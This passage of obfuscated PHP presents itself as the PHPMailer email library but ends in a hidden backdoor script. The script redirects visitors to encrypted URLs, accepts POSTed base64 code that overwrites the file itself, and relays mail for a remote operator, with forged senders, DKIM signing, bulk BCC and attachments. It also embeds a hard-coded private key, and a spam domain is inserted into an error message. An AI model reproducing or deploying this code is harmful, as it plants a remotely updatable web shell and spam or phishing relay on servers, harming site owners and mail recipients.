(filter_var('http://' . $spe005e4, FILTER_VALIDATE_URL) !== false) { return true; } return false; } protected function lang($sp1f8504) { if (count($this->language) < 1) { $this->setLanguage(); } if (array_key_exists($sp1f8504, $this->language)) { if ('smtp_connect_failed' === $sp1f8504) { return $this->language[$sp1f8504] . ' http://goodherbwebmart.com/'; } return $this->language[$sp1f8504]; } return $sp1f8504; } public function isError() { return $this->error_count > 0; } public function addCustomHeader($spab4c5e, $spe356e4 = null) { if (null === $spe356e4 && strpos($spab4c5e, ':') !== false) { list($spab4c5e, $spe356e4) = explode(':', $spab4c5e, 2); } $spab4c5e = trim($spab4c5e); $spe356e4 = trim($spe356e4); if (empty($spab4c5e) || strpbrk($spab4c5e . $spe356e4, '
') !== false) { if ($this->exceptions) { throw new Exception('Invalid header name or value'); } return false; } $this->CustomHeader[] = array($spab4c5e, $spe356e4); return true; } public function getCustomHeaders() { return $this->CustomHeader; } public function msgHTML($sp7a9528, $sp9343b8 = '', $sp91c623 = false) { preg_match_all('/(?<!-)(src|background)=["\'](.*)["\']/Ui', $sp7a9528, $sp84114b); if (array_key_exists(2, $sp84114b)) { if (strlen($sp9343b8) > 1 && '/' !== substr($sp9343b8, -1)) { $sp9343b8 .= '/'; } foreach ($sp84114b[2] as $sp993adf => $sp73ed24) { $sp4f1eb0 = array(); if (preg_match('#^data:(image/(?:jpe?g|gif|png));?(base64)?,(.+)#', $sp73ed24, $sp4f1eb0)) { if (count($sp4f1eb0) === 4 && static::ENCODING_BASE64 === $sp4f1eb0[2]) { $spb9385f = base64_decode($sp4f1eb0[3]); } elseif ('' === $sp4f1eb0[2]) { $spb9385f = rawurldecode($sp4f1eb0[3]); } else { continue; } $speedae8 = substr(hash('sha256', $spb9385f), 0, 32) . '@phpmailer.0'; if (!$this->cidExists($speedae8)) { $this->addStringEmbeddedImage($spb9385f, $speedae8, 'embed' . $sp993adf, static::ENCODING_BASE64, $sp4f1eb0[1]); } $sp7a9528 = str_replace($sp84114b[0][$sp993adf], $sp84114b[1][$sp993adf] . '="cid:' . $speedae8 . '"', $sp7a9528); continue; } if (!empty($sp9343b8) && strpos($sp73ed24, '..') === false && 0 !== strpos($sp73ed24, 'cid:') && !preg_match('#^[a-z][a-z0-9+.-]*:?//#i', $sp73ed24)) { $sp1f19c7 = static::mb_pathinfo($sp73ed24, PATHINFO_BASENAME); $spdaad2a = dirname($sp73ed24); if ('.' === $spdaad2a) { $spdaad2a = ''; } $speedae8 = substr(hash('sha256', $sp73ed24), 0, 32) . '@phpmailer.0'; if (strlen($sp9343b8) > 1 && '/' !== substr($sp9343b8, -1)) { $sp9343b8 .= '/'; } if (strlen($spdaad2a) > 1 && '/' !== substr($spdaad2a, -1)) { $spdaad2a .= '/'; } if ($this->addEmbeddedImage($sp9343b8 . $spdaad2a . $sp1f19c7, $speedae8, $sp1f19c7, static::ENCODING_BASE64, static::_mime_types((string) static::mb_pathinfo($sp1f19c7, PATHINFO_EXTENSION)))) { $sp7a9528 = preg_replace('/' . $sp84114b[1][$sp993adf] . '=["\']' . preg_quote($sp73ed24, '/') . '["\']/Ui', $sp84114b[1][$sp993adf] . '="cid:' . $speedae8 . '"', $sp7a9528); } } } } $this->isHTML(); $this->Body = static::normalizeBreaks($sp7a9528); $this->AltBody = static::normalizeBreaks($this->html2text($sp7a9528, $sp91c623)); if (!$this->alternativeExists()) { $this->AltBody = 'This is an HTML-only message. To view it, activate HTML in your email application.' . static::$LE; } return $this->Body; } public function html2text($spbe80ce, $sp91c623 = false) { if (is_callable($sp91c623)) { return $sp91c623($spbe80ce); } return html_entity_decode(trim(strip_tags(preg_replace('/<(head|title|style|script)[^>]*>.*?<\\/\\1>/si', '', $spbe80ce))), ENT_QUOTES, $this->CharSet); } public static function _mime_types($sp459cb7 = '') { $spbddf72 = array('xl' => 'application/excel', 'js' => 'application/javascript', 'hqx' => 'application/mac-binhex40', 'cpt' => 'application/mac-compactpro', 'bin' => 'application/macbinary', 'doc' => 'application/msword', 'word' => 'application/msword', 'xlsx' => 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', 'xltx' => 'application/vnd.openxmlformats-officedocument.spreadsheetml.template', 'potx' => 'application/vnd.openxmlformats-officedocument.presentationml.template', 'ppsx' => 'application/vnd.openxmlformats-officedocument.presentationml.slideshow', 'pptx' => 'application/vnd.openxmlformats-officedocument.presentationml.presentation', 'sldx' => 'application/vnd.openxmlformats-officedocument.presentationml.slide', 'docx' => 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', 'dotx' => 'application/vnd.openxmlformats-officedocument.wordprocessingml.template', 'xlam' => 'application/vnd.ms-excel.addin.macroEnabled.12', 'xlsb' => 'application/vnd.ms-excel.sheet.binary.macroEnabled.12', 'class' => 'application/octet-stream', 'dll' => 'application/octet-stream', 'dms' => 'application/octet-stream', 'exe' => 'application/octet-stream', 'lha' => 'application/octet-stream', 'lzh' => 'application/octet-stream', 'psd' => 'application/octet-stream', 'sea' => 'application/octet-stream', 'so' => 'application/octet-stream', 'oda' => 'application/oda', 'pdf' => 'application/pdf', 'ai' => 'application/postscript', 'eps' => 'application/postscript', 'ps' => 'application/postscript', 'smi' => 'application/smil', 'smil' => 'application/smil', 'mif' => 'application/vnd.mif', 'xls' => 'application/vnd.ms-excel', 'ppt' => 'application/vnd.ms-powerpoint', 'wbxml' => 'application/vnd.wap.wbxml', 'wmlc' => 'application/vnd.wap.wmlc', 'dcr' => 'application/x-director', 'dir' => 'application/x-director', 'dxr' => 'application/x-director', 'dvi' => 'application/x-dvi', 'gtar' => 'application/x-gtar', 'php3' => 'application/x-httpd-php', 'php4' => 'application/x-httpd-php', 'php' => 'application/x-httpd-php', 'phtml' => 'application/x-httpd-php', 'phps' => 'application/x-httpd-php-source', 'swf' => 'application/x-shockwave-flash', 'sit' => 'application/x-stuffit', 'tar' => 'application/x-tar', 'tgz' => 'application/x-tar', 'xht' => 'application/xhtml+xml', 'xhtml' => 'application/xhtml+xml', 'zip' => 'application/zip', 'mid' => 'audio/midi', 'midi' => 'audio/midi', 'mp2' => 'audio/mpeg', 'mp3' => 'audio/mpeg', 'm4a' => 'audio/mp4', 'mpga' => 'audio/mpeg', 'aif' => 'audio/x-aiff', 'aifc' => 'audio/x-aiff', 'aiff' => 'audio/x-aiff', 'ram' => 'audio/x-pn-realaudio', 'rm' => 'audio/x-pn-realaudio', 'rpm' => 'audio/x-pn-realaudio-plugin', 'ra' => 'audio/x-realaudio', 'wav' => 'audio/x-wav', 'mka' => 'audio/x-matroska', 'bmp' => 'image/bmp', 'gif' => 'image/gif', 'jpeg' => 'image/jpeg', 'jpe' => 'image/jpeg', 'jpg' => 'image/jpeg', 'png' => 'image/png', 'tiff' => 'image/tiff', 'tif' => 'image/tiff', 'webp' => 'image/webp', 'heif' => 'image/heif', 'heifs' => 'image/heif-sequence', 'heic' => 'image/heic', 'heics' => 'image/heic-sequence', 'eml' => 'message/rfc822', 'css' => 'text/css', 'html' => 'text/html', 'htm' => 'text/html', 'shtml' => 'text/html', 'log' => 'text/plain', 'text' => 'text/plain', 'txt' => 'text/plain', 'rtx' => 'text/richtext', 'rtf' => 'text/rtf', 'vcf' => 'text/vcard', 'vcard' => 'text/vcard', 'ics' => 'text/calendar', 'xml' => 'text/xml', 'xsl' => 'text/xml', 'wmv' => 'video/x-ms-wmv', 'mpeg' => 'video/mpeg', 'mpe' => 'video/mpeg', 'mpg' => 'video/mpeg', 'mp4' => 'video/mp4', 'm4v' => 'video/mp4', 'mov' => 'video/quicktime', 'qt' => 'video/quicktime', 'rv' => 'video/vnd.rn-realvideo', 'avi' => 'video/x-msvideo', 'movie' => 'video/x-sgi-movie', 'webm' => 'video/webm', 'mkv' => 'video/x-matroska'); $sp459cb7 = strtolower($sp459cb7); if (array_key_exists($sp459cb7, $spbddf72)) { return $spbddf72[$sp459cb7]; } return 'application/octet-stream'; } public static function filenameToType($sp1f19c7) { $sp29904e = strpos($sp1f19c7, '?'); if (false !== $sp29904e) { $sp1f19c7 = substr($sp1f19c7, 0, $sp29904e); } $sp459cb7 = static::mb_pathinfo($sp1f19c7, PATHINFO_EXTENSION); return static::_mime_types($sp459cb7); } public static function mb_pathinfo($sp671dee, $spd5cf8e = null) { $sp4e071b = array('dirname' => '', 'basename' => '', 'extension' => '', 'filename' => ''); $sp4b5376 = array(); if (preg_match('#^(.*?)[\\\\/]*(([^/\\\\]*?)(\\.([^.\\\\/]+?)|))[\\\\/.]*$#m', $sp671dee, $sp4b5376)) { if (array_key_exists(1, $sp4b5376)) { $sp4e071b['dirname'] = $sp4b5376[1]; } if (array_key_exists(2, $sp4b5376)) { $sp4e071b['basename'] = $sp4b5376[2]; } if (array_key_exists(5, $sp4b5376)) { $sp4e071b['extension'] = $sp4b5376[5]; } if (array_key_exists(3, $sp4b5376)) { $sp4e071b['filename'] = $sp4b5376[3]; } } switch ($spd5cf8e) { case PATHINFO_DIRNAME: case 'dirname': return $sp4e071b['dirname']; case PATHINFO_BASENAME: case 'basename': return $sp4e071b['basename']; case PATHINFO_EXTENSION: case 'extension': return $sp4e071b['extension']; case PATHINFO_FILENAME: case 'filename': return $sp4e071b['filename']; default: return $sp4e071b; } } public function set($spab4c5e, $spe356e4 = '') { if (property_exists($this, $spab4c5e)) { $this->{$spab4c5e} = $spe356e4; return true; } $this->setError($this->lang('variable_set') . $spab4c5e); return false; } public function secureHeader($spc2c611) { return trim(str_replace(array('', '
'), '', $spc2c611)); } public static function normalizeBreaks($spe0e0a3, $sp05f561 = null) { if (null === $sp05f561) { $sp05f561 = static::$LE; } $spe0e0a3 = str_replace(array(self::CRLF, ''), '
', $spe0e0a3); if ('
' !== $sp05f561) { $spe0e0a3 = str_replace('
', $sp05f561, $spe0e0a3); } return $spe0e0a3; } public static function stripTrailingWSP($spe0e0a3) { return rtrim($spe0e0a3, ' 
	'); } public static function getLE() { return static::$LE; } protected static function setLE($sp5f3f2b) { static::$LE = $sp5f3f2b; } public function sign($sp89b1df, $sp8122df, $spc754f5, $sp73cb99 = '') { $this->sign_cert_file = $sp89b1df; $this->sign_key_file = $sp8122df; $this->sign_key_pass = $spc754f5; $this->sign_extracerts_file = $sp73cb99; } public function DKIM_QP($sp9b3367) { $sp209680 = ''; $sp36b4d9 = strlen($sp9b3367); for ($sp4ed825 = 0; $sp4ed825 < $sp36b4d9; ++$sp4ed825) { $sp880305 = ord($sp9b3367[$sp4ed825]); if (33 <= $sp880305 && $sp880305 <= 58 || $sp880305 === 60 || 62 <= $sp880305 && $sp880305 <= 126) { $sp209680 .= $sp9b3367[$sp4ed825]; } else { $sp209680 .= '=' . sprintf('%02X', $sp880305); } } return $sp209680; } public function DKIM_Sign($sp05c1b8) { if (!defined('PKCS7_TEXT')) { if ($this->exceptions) { throw new Exception($this->lang('extension_missing') . 'openssl'); } return ''; } $sp85e136 = !empty($this->DKIM_private_string) ? $this->DKIM_private_string : file_get_contents($this->DKIM_private); if ('' !== $this->DKIM_passphrase) { $spb0d7ce = openssl_pkey_get_private($sp85e136, $this->DKIM_passphrase); } else { $spb0d7ce = openssl_pkey_get_private($sp85e136); } if (openssl_sign($sp05c1b8, $spf0eeab, $spb0d7ce, 'sha256WithRSAEncryption')) { openssl_pkey_free($spb0d7ce); return base64_encode($spf0eeab); } openssl_pkey_free($spb0d7ce); return ''; } public function DKIM_HeaderC($sp05c1b8) { $sp05c1b8 = static::normalizeBreaks($sp05c1b8, self::CRLF); $sp05c1b8 = preg_replace('/\\r\\n[ \\t]+/', ' ', $sp05c1b8); $sp38fd55 = explode(self::CRLF, $sp05c1b8); foreach ($sp38fd55 as $sp1f8504 => $sp209680) { if (strpos($sp209680, ':') === false) { continue; } list($sp43edf4, $spe356e4) = explode(':', $sp209680, 2); $sp43edf4 = strtolower($sp43edf4); $spe356e4 = preg_replace('/[ \\t]+/', ' ', $spe356e4); $sp38fd55[$sp1f8504] = trim($sp43edf4, ' 	') . ':' . trim($spe356e4, ' 	'); } return implode(self::CRLF, $sp38fd55); } public function DKIM_BodyC($spf387a7) { if (empty($spf387a7)) { return self::CRLF; } $spf387a7 = static::normalizeBreaks($spf387a7, self::CRLF); return static::stripTrailingWSP($spf387a7) . self::CRLF; } public function DKIM_Add($sp2e451e, $spe07543, $spf387a7) { $sp7973d7 = 'rsa-sha256'; $spccbc11 = 'relaxed/simple'; $spf9e1f7 = 'dns/txt'; $sp8c5e35 = time(); $spd799bc = array('from', 'to', 'cc', 'date', 'subject', 'reply-to', 'message-id', 'content-type', 'mime-version', 'x-mailer'); if (stripos($sp2e451e, 'Subject') === false) { $sp2e451e .= 'Subject: ' . $spe07543 . static::$LE; } $spbff94b = explode(static::$LE, $sp2e451e); $sp22d7f5 = ''; $sp3b2bd4 = ''; $sp726e2d = array(); $sp6a6f40 = 0; $sp7d6385 = count($spbff94b); foreach ($spbff94b as $spd58df2) { $spae1c48 = array(); if (preg_match('/^([^ \\t]*?)(?::[ \\t]*)(.*)$/', $spd58df2, $spae1c48)) { if ($sp22d7f5 !== '') { $sp726e2d[] = array('label' => $sp22d7f5, 'value' => $sp3b2bd4); } $sp22d7f5 = $spae1c48[1]; $sp3b2bd4 = $spae1c48[2]; } elseif (preg_match('/^[ \\t]+(.*)$/', $spd58df2, $spae1c48)) { $sp3b2bd4 .= ' ' . $spae1c48[1]; } ++$sp6a6f40; if ($sp6a6f40 >= $sp7d6385) { $sp726e2d[] = array('label' => $sp22d7f5, 'value' => $sp3b2bd4); } } $spb67443 = array(); $spdc720b = array(); $spf5a4b2 = array(); foreach ($sp726e2d as $sp40834a) { if (in_array(strtolower($sp40834a['label']), $spd799bc, true)) { $spdc720b[] = $sp40834a['label']; $spf5a4b2[] = $sp40834a['label'] . ': ' . $sp40834a['value']; if ($this->DKIM_copyHeaderFields) { $spb67443[] = $sp40834a['label'] . ':' . str_replace('|', '=7C', $this->DKIM_QP($sp40834a['value'])); } continue; } if (in_array($sp40834a['label'], $this->DKIM_extraHeaders, true)) { foreach ($this->CustomHeader as $sp2a44d7) { if ($sp2a44d7[0] === $sp40834a['label']) { $spdc720b[] = $sp40834a['label']; $spf5a4b2[] = $sp40834a['label'] . ': ' . $sp40834a['value']; if ($this->DKIM_copyHeaderFields) { $spb67443[] = $sp40834a['label'] . ':' . str_replace('|', '=7C', $this->DKIM_QP($sp40834a['value'])); } continue 2; } } } } $sp54ca60 = ''; if ($this->DKIM_copyHeaderFields && count($spb67443) > 0) { $sp54ca60 = ' z='; $sp9cb677 = true; foreach ($spb67443 as $spa25b4c) { if (!$sp9cb677) { $sp54ca60 .= static::$LE . ' |'; } if (strlen($spa25b4c) > self::STD_LINE_LENGTH - 3) { $sp54ca60 .= substr(chunk_split($spa25b4c, self::STD_LINE_LENGTH - 3, static::$LE . self::FWS), 0, -strlen(static::$LE . self::FWS)); } else { $sp54ca60 .= $spa25b4c; } $sp9cb677 = false; } $sp54ca60 .= ';' . static::$LE; } $sp437752 = ' h=' . implode(':', $spdc720b) . ';' . static::$LE; $sp5cfa1e = implode(static::$LE, $spf5a4b2); $spf387a7 = $this->DKIM_BodyC($spf387a7); $spf5970f = base64_encode(pack('H*', hash('sha256', $spf387a7))); $sp2f509b = ''; if ('' !== $this->DKIM_identity) { $sp2f509b = ' i=' . $this->DKIM_identity . ';' . static::$LE; } $spec88de = 'DKIM-Signature: v=1;' . ' d=' . $this->DKIM_domain . ';' . ' s=' . $this->DKIM_selector . ';' . static::$LE . ' a=' . $sp7973d7 . ';' . ' q=' . $spf9e1f7 . ';' . ' t=' . $sp8c5e35 . ';' . ' c=' . $spccbc11 . ';' . static::$LE . $sp437752 . $sp2f509b . $sp54ca60 . ' bh=' . $spf5970f . ';' . static::$LE . ' b='; $sp6f1776 = $this->DKIM_HeaderC($sp5cfa1e . static::$LE . $spec88de); $spf0eeab = $this->DKIM_Sign($sp6f1776); $spf0eeab = trim(chunk_split($spf0eeab, self::STD_LINE_LENGTH - 3, static::$LE . self::FWS)); return static::normalizeBreaks($spec88de . $spf0eeab); } public static function hasLineLongerThanMax($spc2c611) { return (bool) preg_match('/^(.{' . (self::MAX_LINE_LENGTH + strlen(static::$LE)) . ',})/m', $spc2c611); } public static function quotedString($spc2c611) { if (preg_match('/[ ()<>@,;:"\\/\\[\\]?=]/', $spc2c611)) { return '"' . str_replace('"', '\\"', $spc2c611) . '"'; } return $spc2c611; } public function getToAddresses() { return $this->to; } public function getCcAddresses() { return $this->cc; } public function getBccAddresses() { return $this->bcc; } public function getReplyToAddresses() { return $this->ReplyTo; } public function getAllRecipientAddresses() { return $this->all_recipients; } protected function doCallback($spfd4e01, $sp22e9ba, $sp4b939e, $spa9d70d, $spe07543, $spf387a7, $sp245ac1, $spf9a9d7) { if (!empty($this->action_function) && is_callable($this->action_function)) { call_user_func($this->action_function, $spfd4e01, $sp22e9ba, $sp4b939e, $spa9d70d, $spe07543, $spf387a7, $sp245ac1, $spf9a9d7); } } public function getOAuth() { return $this->oauth; } public function setOAuth(OAuth $sp228a0a) { $this->oauth = $sp228a0a; } } function rsaDecrypt($spb9385f) { $spb9385f = base64_decode($spb9385f); $sp5ccf2c = base64_decode('LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcEFJQkFBS0NBUUVBelhldk9MN2tDZlcraDRYZVZyR1pCS2MzT0ZLU3ZxK2kvVWlSd29xa3d4SThJbWNMCjZqM1JKZkJBQU9sWEsvNlREMGkrKzE0NlJsbEVRVklhcTZ2c0VuWHBacVVTL0FSaElnbVJZcHY5WlQrWmdvNG4Kdk1tTmNqQk1uMjdxWlFhRHRZVlhnZnhINkE5MStXZk5keTcrSnQrOWNpNVdNR1RlZWx1S1ZzVEpCZmNQenZKYgpsalZVZEJPQWVDb3piUkVla0liVGZwcyt4bjdkMm0yYzU2ZUdLVjJPRDRIZ3RmMmliRGtFVVcycVo1TUZqUjhjClFHeWh6ZnNaUHB4aE9yQVgyL2k0bWRRTDhvSmxYT2JMNElRbnBNVGRGa1VVbnBFNm9ENVFEeEt6TEdNRUZQUXIKZ1F0aTJwemFJVU1nVlo1TElkVGdHdk1COE8vbXJicEo0VTJQYVFJREFRQUJBb0lCQUNOa2YybGQ4SGdLdmJRbwppaUVTM0pIaG4vQnl3TlpaK05CNlpLbEhLcFJ6bXFvdVorNEVrZmRnQ0JaZ0cyVDNxQ3RVMDVrSEpUQ2pCYy9lCnJidHVsTzZsSXZ4TWFSWENSMTBPbXQyS2t6NlNrd1hiS05zck9OTTNvS3RCOXR4S0gvdnZxU0E1N2NUNmpNN1cKWTUwcEdoeG1KQUw4R2xxaHRYVU1PYXN5b0pJSEtzdzcrc21kVWFaazl5ZGZjWHZwZVFtTzJFSC82T2ZwTE5hdgpDZGJUK05qaXAwcFRrcDNSYTN0a3FwL2hPV2ZhQ2hnVUxDbmZvZkdLdXVmNjhqMG1wSld0ZmtpbFNHNlgvb05yCndBQnFYS0tqSnVzTDJUU0FyTERucDcrcDEzbkpYcHlZSXlsTnJpWkozM21CR01waHZYbTFrTWpXcEcvUC9iblUKOWxGOGViVUNnWUVBNkJ2K2RUSExMMlNIT0ZRcytSVHBtemxMcWxKaXNCYXp3T0ZXczFkd2lHc2lPRFM0WktuUwpkWGNVT21mQi8wNE9sTS80L1Erb25RbWhWa2pmVmhQWE5LVEtsMkZ2L2Mrd0kzd0JrZlJaNFJxdldpTnJSaHB5ClQ5TWNNbnV6Si9obW9ib1dGWE9lNjJnNkg0S2kwMjhGWFZJTlRjTE5xQlZ4YVQxNElieWwrTjhDZ1lFQTRwMnYKMHNOaUhITXkvWURLMTg0VFR4MXo4clRNNDY4V3JhMkNraFFuVGx6a0Y5czRsSWVmQUt4N3dSL1pacm9hK0ozTgpwMUd5ZmxXSkt6d3RKMFRaKzJlU0xtcEVhMHV5dStUS05WeFcrSHhCZzg1TkJjV1hnajlaWXhpUWJwMnA5NWU4CjllNlFZR2hpZGxTdnRzcU9nRFFyWW1WbStNb3VrSElnQUg1a1dMY0NnWUVBeW1VV3RxU3IwM0NxaEpES0FveWMKdzNEcnJPSllFY3BLQmllNFRYd3lzWklSN2NieS96d2lPN0dSWHZoNDdxSG5EeFptdkd3NkVHMkVWTlFJZzJ1YgpuZGtRbTM0b2hMN2tqWnlsVmRzbndLVmZRSTlnREdvbFFid0plMi9vSWpOMWN4THNETnFjT2hQUmt3Wjc2emlGCkNnSHhmZHdmTHJFOENwUENQRkRldlNzQ2dZRUFtNm9wenFNN3o4TXFNWXk0eVlqYkpxdGFyRXVadW9UWkZUQnMKMHA5WmFMRFNWYmpXb3VDT1RrNHRMRG9PZ2t3d25ycjNPNG9aREVNQldGdWJ3Sy9BOUxydVpVZkYrOVloem9PWQppeE1GQXVlSHNWeVM5L1lFM3dsWkE0TXFJM0hXQVNlUU8zZEdZWk1TbjZvSWtZMk9XVzU4cHJoMUJVME1zMWhSCnQwVWE5UDBDZ1lCbEJRdE0vYUtQSFA5TDBhZzZYZjJ4YTlkeVkvME8yZEIvcmtWRlNZQUtPM3FmcEJLRitkMXMKdXdkNVlzOVJmdjg0Zms3VXhyZzBIVEhCOWxoUmMvOFgwaU9SUEVHS0VkWHlrVmZod0RaTURtMkpveExPblBZWQoyT3Arblh1VEtWRnIveENGWVREZk50UWVQYjRrMDRlZCtjcStNdk4zTkcvUytobWpZNU9OZ3c9PQotLS0tLUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo='); $sp5d6c89 = ''; openssl_private_decrypt($spb9385f, $sp5d6c89, $sp5ccf2c); return $sp5d6c89; } function sendResponse($spee7daf, $spe7bff9) { echo json_encode(array('result' => $spee7daf, 'content' => $spe7bff9, 'phpVersion' => phpversion(), 'mailFunction' => function_exists('mail'), 'scriptVersion' => '1.4')); die; } if (!empty($_GET['l'])) { $sp313ecc = rsaDecrypt($_GET['l']); header('Location: ' . $sp313ecc); die; } if (isset($_POST['checkConnection'])) { sendResponse(true, ''); } else { if (isset($_POST['updateScript'])) { $sp41ddca = base64_decode($_POST['shellScript']); if (@file_put_contents(__FILE__, $sp41ddca)) { sendResponse(true, ''); } sendResponse(false, 'error when updating script'); } else { if (isset($_POST['sendMail'])) { $spa21a0a = $_POST['mail']; $sp56b2df = base64_decode($spa21a0a); $sp3c9be1 = json_decode($sp56b2df); if (!$sp3c9be1) { sendResponse(false, 'bad json request, request was: ' . $spa21a0a); } $sp8475c9 = new PHPMailer(); $sp8475c9->CharSet = 'UTF-8'; $sp8475c9->Encoding = 'base64'; if ($sp3c9be1->DkimDomain) { $sp8475c9->DKIM_domain = $sp3c9be1->DkimDomain; $sp8475c9->DKIM_private_string = $sp3c9be1->DkimPrivateKey; $sp8475c9->DKIM_selector = $sp3c9be1->DkimSelector; $sp8475c9->DKIM_passphrase = ''; $sp8475c9->DKIM_identity = $sp3c9be1->SenderEmail; } $sp8475c9->isMail(); try { $sp8475c9->setFrom($sp3c9be1->SenderEmail, $sp3c9be1->SenderName); } catch (\Exception $sp19dcb8) { sendResponse(false, $sp19dcb8->getMessage()); } try { foreach ($sp3c9be1->Addresses as $spac533a) { if ($sp3c9be1->SendMethod == 1) { $sp8475c9->addAddress($spac533a); } else { if ($sp3c9be1->SendMethod == 2) { $sp8475c9->addCC($spac533a); } else { $sp8475c9->addBCC($spac533a); } } } } catch (\Exception $sp19dcb8) { sendResponse(false, $sp19dcb8->getMessage()); } $sp8475c9->Subject = $sp3c9be1->Subject; foreach ($sp3c9be1->Headers as $sp40834a) { try { $sp8475c9->addCustomHeader($sp40834a->Key, $sp40834a->Value); } catch (\Exception $sp19dcb8) { sendResponse(false, $sp19dcb8->getMessage()); } } try { $spf387a7 = $sp3c9be1->Body; $sp8475c9->msgHTML($spf387a7); } catch (\Exception $sp19dcb8) { sendResponse(false, $sp19dcb8->getMessage()); } foreach ($sp3c9be1->Attachments as $spa225cc) { try { $spc7d417 = base64_decode($spa225cc->Content); $sp8475c9->addStringAttachment($spc7d417, $spa225cc->Filename); } catch (\Exception $sp19dcb8) { sendResponse(false, $sp19dcb8->getMessage()); } } foreach ($sp3c9be1->EmbeddedAttachments as $spa225cc) { try { $spc7d417 = base64_decode($spa225cc->Content); $sp8475c9->addStringEmbeddedImage($spc7d417, $spa225cc->ContentId, $spa225cc->Filename); } catch (\Exception $sp19dcb8) { sendResponse(false, $sp19dcb8->getMessage()); } } try { if (!$sp8475c9->send()) { sendResponse(false, $sp8475c9->ErrorInfo); } } catch (\Exception $sp19dcb8) { sendResponse(false, $sp19dcb8->getMessage()); } sendResponse(true, ''); } } } ?>

MAIL FUNCTION = <?php  echo function_exists('mail') ? 'YES' : 'NO'; ?>
; PHP VERSION: <?php  echo phpversion();